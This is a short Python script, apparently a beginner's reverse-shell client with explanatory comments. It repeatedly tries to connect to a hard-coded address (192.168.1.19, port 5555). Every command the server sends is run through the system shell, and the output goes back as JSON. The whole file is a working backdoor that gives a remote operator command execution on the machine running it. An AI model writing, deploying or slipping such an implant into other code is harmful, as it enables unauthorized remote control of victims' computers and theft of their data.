import socket #tells python you will be communicating over a network
import time
import json
import subprocess #Allows us to execute commands sent to server


def connection():
    while True:
        time.sleep(15)
        try:
            sock.connect(('192.168.1.19', 5555)) #Has the socket try top connect to IP address and port
            shell() #see def shell
            sock.close() #closes connection when shell is done
            break
        except:
            connection()

def shell():
    while True:
        command = reliable_recv()
        if command =='quit':
            break
        else:
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin = subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()
            result = result.decode()
            reliable_send(result)

def  reliable_send(data): #Sends commands to server
    jsondata = json.dumps(data)
    sock.send(jsondata.encode()) #target is a var created with sock.accept

def reliable_recv(): #Recieves commands from server
    data = ''
    while True:
        try:
            data = data + sock.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

connection()